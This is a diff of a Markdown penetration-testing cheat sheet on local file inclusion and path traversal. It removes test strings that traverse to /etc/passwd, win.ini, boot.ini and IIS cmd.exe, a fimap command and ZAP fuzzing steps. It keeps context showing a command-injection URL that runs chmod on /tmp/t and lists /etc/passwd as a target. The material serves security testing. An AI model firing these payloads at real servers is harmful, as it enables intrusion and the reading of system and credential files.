@@ -32,30 +32,6 @@ http://victim/file?arg=$({chmod,+x,/tmp/t})
 
 **Test Strings:**
 
-Linux Test String 1 | <code> http://website/?p=file%3a%2f%2f%2fetc%2fpasswd </code>
-Linux Test String 2 | <code> /ect/passwd </code>
-Linux Test String 3 | <code> ../../../../../../../../../../../../../../ect/passwd </code>
-Windows IIS 1 | <code> ../../../winnt/system32.cmd.exe+/c+dir (not frequent) </code>
-Windows Test String 1 | <code> %WINDIR%\win.ini </code>
-Windows Test String 2 | <code> %SYSTEMDRIVE%\boot.ini //note only older versions of windows </code>
-
-**Test Tool - fimap**
-{% highlight bash %}
-fimap -u 'http://website/?p=file.html'
-{% endhighlight %}
-
-**Using ZAP to Fuzz the URL:**
-1. Right click on request that looks injectable -> fuzz using
-[JHADDIX_LFI](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/lfi/JHADDIX_LFI.txt)
-
-**What to go after - Windows:**
-* Old IIS: HTTP://vulnsite/scripts/../../../winnt/system32/CMD.exe+/C+dir (may need to encode the slashes)
-* http://vulnsite/index.php?templ=../include/siteconfig.inc (or just templ=red)
-* /global.asax
-* \docume~1\fprefect\mydocu~1
-* \windows\system32\cmd.exe
-* [Windows pwnwiki](http://pwnwiki.io/#!presence/windows/blind.md)
-
 **What to go after - Linux:**
 * /etc/passwd
 * [Linux pwnwiki](http://pwnwiki.io/#!presence/linux/blind.md)
